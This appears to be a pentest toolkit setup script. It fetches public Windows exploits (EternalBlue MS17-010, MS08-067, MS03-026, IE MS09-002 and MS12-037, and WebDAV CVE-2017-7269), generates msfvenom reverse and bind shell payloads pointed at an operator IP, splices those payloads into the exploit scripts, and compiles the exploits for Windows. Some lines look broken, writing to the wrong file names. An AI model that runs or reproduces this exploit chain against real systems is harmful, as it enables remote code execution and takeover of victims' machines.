# i686-w64-mingw32-gcc ex.c -lws2_32 -o ex.exe
# wine ~/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile ex.py

# i686-w64-mingw32-gcc [.c] -o [.exe] [-lws2_32]
# i686-w64-mingw32-g++ [.cpp] -o [.exe] [-lws2_32]

# MS17-010 - START
mkdir -p public/exploits_windows/smb/ms17-010
cd public/exploits_windows/smb/ms17-010
    banner "exploits_windows/smb/ms17-010 - https://github.com/helviojunior/MS17-010.git"
    git clone --depth=1 --recursive https://github.com/helviojunior/MS17-010.git .

    if [ ! -f ./shellcode/sc_x64_rev.bin ] || changeRemoteOnly || confirm "Regenerate payloads for exploits_windows/smb/ms17-010 [y/n]? "; then
        nasm -f bin shellcode/eternalblue_kshellcode_x64.asm -o ./shellcode/sc_x64_kernel.bin
        msfvenom -p windows/x64/shell_reverse_tcp LPORT=$source_port LHOST=$source_ip EXITFUNC=thread --platform windows -a x64 --format raw -o ./shellcode/sc_x64_payload_rev.bin
        msfvenom -p windows/x64/shell_bind_tcp LPORT=$remote_port --platform windows -a x64 --format raw -e x86/shikata_ga_nai -o ./shellcode/sc_x64_payload.bin
        cat ./shellcode/sc_x64_kernel.bin ./shellcode/sc_x64_payload.bin > ./shellcode/sc_x64.bin
        cat ./shellcode/sc_x64_kernel.bin ./shellcode/sc_x64_payload_rev.bin > ./shellcode/sc_x64_rev.bin

        nasm -f bin shellcode/eternalblue_kshellcode_x86.asm -o ./shellcode/sc_x86_kernel.bin
        msfvenom -p windows/shell_reverse_tcp LPORT=$source_port LHOST=$source_ip EXITFUNC=thread --platform windows -a x86 --format raw -e x86/shikata_ga_nai -o ./shellcode/sc_x86_payload_rev.bin
        msfvenom -p windows/shell_bind_tcp LPORT=$remote_port --platform windows -a x86 --format raw -e x86/shikata_ga_nai -o ./shellcode/sc_x86_payload.bin
        cat ./shellcode/sc_x86_kernel.bin ./shellcode/sc_x86_payload.bin > ./shellcode/sc_x86.bin
        cat ./shellcode/sc_x86_kernel.bin ./shellcode/sc_x86_payload_rev.bin > ./shellcode/sc_x86_rev.bin

        python ./shellcode/eternalblue_sc_merge.py ./shellcode/sc_x86.bin ./shellcode/sc_x64.bin ./shellcode/sc_all.bin
        python ./shellcode/eternalblue_sc_merge.py ./shellcode/sc_x86_rev.bin ./shellcode/sc_x64_rev.bin ./shellcode/sc_all_rev.bin
    fi
cd ../../../..
# MS17-010 - END

# MS09-002 - START
mkdir -p public/exploits_windows/ie/ms09-002
cd public/exploits_windows/ie/ms09-002

        banner "exploits_windows/ie/ms09-002 - https://www.exploit-db.com/exploits/8080"
        searchsploit -m 8080 
        js_le_payload=`cat ../../../payloads_windows/shell_reverse_tcp_x86.js_le`
        rm 8080_rev.py
        cp 8080.py 8080_rev.py
        sed -i "37s/.*/var c = unescape(\"$js_le_payload\");/" 8080_rev.py

        banner "exploits_windows/ie/ms09-002 - https://www.exploit-db.com/exploits/8152"
        searchsploit -m 8152
        rm 8152_rev.py
        cat 8152.py | head -n 17 > 8152_rev.py
        python_payload=`cat ../../../payloads_windows/shell_reverse_tcp_x86.python`
        echo "payload  = '$python_payload'" >> 8152_rev.py
        cat 8152.py | tail -n 102 >> 8152_rev.py

cd ../../../..
# MS09-002 - END

# MS12-037 - START
mkdir -p public/exploits_windows/ie/ms12-037
cd public/exploits_windows/ie/ms12-037

    if [ ! -f 8080_rev.py ]; then
        banner "exploits_windows/ie/ms09-002 - https://www.exploit-db.com/exploits/24017"
        searchsploit -m 24017 

        rm 24017_bind.html
        cat 24017.py | head -n 178 > 24017_bind.py
        js_le_payload=`cat ../../../payloads_windows/shell_reverse_tcp_x86.js_le`
        echo "shellcode+= unescape(\"$js_le_payload\");" >> 8152_rev.py
        cat 24017.py | tail -n 54 >> 24017_bind.py
    fi

cd ../../../..
# MS12-037 - END

mkdir -p public/exploits_windows/webdav
cd public/exploits_windows/webdav

    if [ ! -f ScStoragePathFromUrl-explodingcan.py ]; then
        banner "exploits_windows/webdav - ScStoragePathFromUrl-explodingcan - https://github.com/danigargu/explodingcan"
        wget -N https://github.com/danigargu/explodingcan/raw/master/explodingcan.py
        mv explodingcan.py ScStoragePathFromUrl-explodingcan.py
    fi

    if [ ! -d ScStoragePathFromUrl-CVE-2017-7269 ]; then
        banner "exploits_windows/webdav - ScStoragePathFromUrl-CVE-2017-7269 - https://github.com/gottburgm/Exploits/tree/master/CVE-2017-7269"
        mkdir ScStoragePathFromUrl-CVE-2017-7269
        wget -N -P ScStoragePathFromUrl-CVE-2017-7269 https://raw.githubusercontent.com/gottburgm/Exploits/master/CVE-2017-7269/CVE_2017_7269.pl
        wget -N -P ScStoragePathFromUrl-CVE-2017-7269 https://raw.githubusercontent.com/gottburgm/Exploits/master/CVE-2017-7269/install.sh
    fi

cd ../../..

mkdir -p public/exploits_windows/rpc
cd public/exploits_windows/rpc

    if [ ! -f ms08-067-NetAPI-exploitdb.py ]; then
        banner "exploits_windows/rpc - ms08-067-NetAPI-exploitdb.py - https://www.exploit-db.com/exploits/40279"
        searchsploit -m 40279
        mv 40279.py ms08-067-NetAPI-exploitdb.py
    fi

    # https://labs.f-secure.com/assets/BlogFiles/hello-ms08-067-my-old-friend.pdf
    banner "exploits_windows/rpc - ms08-067-NetAPI - https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py"
    wget -N https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py
    banner "exploits_windows/rpc - ms08-067-NetAPI - https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067_w2k3_sp2.py"
    wget -N https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067_w2k3_sp2.py

    banner "exploits_windows/rpc - ms08-067-NetAPI-exploitdb.c - https://www.exploit-db.com/exploits/7104"
    searchsploit -m 7104 
    mv 7104.c ms08-067-NetAPI-exploitdb.c
    i686-w64-mingw32-gcc ms08-067-NetAPI-exploitdb.c -lws2_32 -o ms08-067-NetAPI-exploitdb.exe
    gcc -o ms08-067-NetAPI-exploitdb.exe ms08-067-NetAPI-exploitdb.c 

    # MS03-026 (Port 135)
    if [ ! -f ms03-026-DCOM-RPC-66.exe ]; then
        searchsploit -m 66
        mv 100.c ms03-026-DCOM-RPC-66.c
        i686-w64-mingw32-gcc ms03-026-DCOM-RPC-66.c -lws2_32 -o ms03-026-DCOM-RPC-66.exe
    fi

    if [ ! -f ms03-026-DCOM-RPC-100 ]; then
        searchsploit -m 100
        mv 100.c ms03-026-DCOM-RPC-100.c
        gcc -o ms03-026-DCOM-RPC-100 ms03-026-DCOM-RPC-100.c
    fi

cd ../../..
